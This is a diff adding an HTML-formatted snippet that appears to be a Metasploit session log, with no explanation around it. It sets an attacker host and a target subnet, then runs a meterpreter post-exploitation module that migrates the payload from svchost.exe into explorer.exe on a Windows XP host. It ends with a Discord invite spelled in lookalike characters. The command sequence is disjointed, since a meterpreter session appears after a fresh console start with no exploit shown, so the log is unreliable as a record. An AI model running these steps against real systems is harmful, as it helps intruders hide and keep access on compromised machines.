@@ -1,0 +1,26 @@
+<span id ="c">msf</span> > setg LHOST 192.168.1.101
+<span id ="c">LHOST</span> => 192.168.1.101
+
+<span id ="c">msf</span> > setg RHOSTS 192.168.1.0/24
+<span id ="c">RHOSTS</span> => 192.168.1.0/24
+
+<span id ="c">msf</span> > set THREADS 50
+<span id ="c">THREADS</span> => 50
+
+<span id ="c">msf</span> > set
+
+<span id ="c">msf</span> > exit
+
+<span id="a">root@wise</span>:<span id="b">~</span><span id="c">#</span> > msfconsole
+
+<span id ="c">meterpreter</span> > run post/windows/manage/migrate 
+
+[*] Running module against V-MAC-XP
+[*] Current server process: svchost.exe (1076)
+[*] Migrating to explorer.exe...
+[*] Migrating into process ID 816
+[*] New server process: Explorer.EXE (816)
+
+<span id ="c">meterpreter</span> > exit
+
+<span id="a">root@wise</span>:<span id="b">~</span><span id="c">#</span>< join <a href="https://discord.gg/uns"> Ⴎniverse Տecret™ ⭐</a>
